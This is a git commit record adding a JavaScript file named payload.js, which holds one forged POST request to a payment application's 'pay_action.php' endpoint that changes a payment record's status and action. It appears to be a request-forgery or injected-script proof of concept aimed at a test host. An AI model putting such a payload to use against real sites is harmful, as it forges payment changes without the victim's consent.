6e5ff4531ceb69cf3256dd6711af643569f152af
Kevin Larson <emailkevinlarson@gmail.com>
2026-05-27 20:16:12 -0700

    adding test file

---
+++ public/payload.js
@@ -0,0 +1,8 @@
+fetch('/pay_action.php?id=3973&py=339', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Origin': 'https://constructtest.abrigo.com'
+  },
+  body: 'frmPayHistoryID=339&frmProjectID=3973&frmPaymentStatus=P&phAmount_textmax=&frmPayAction=FA&frmActionNotes=asdf'
+});
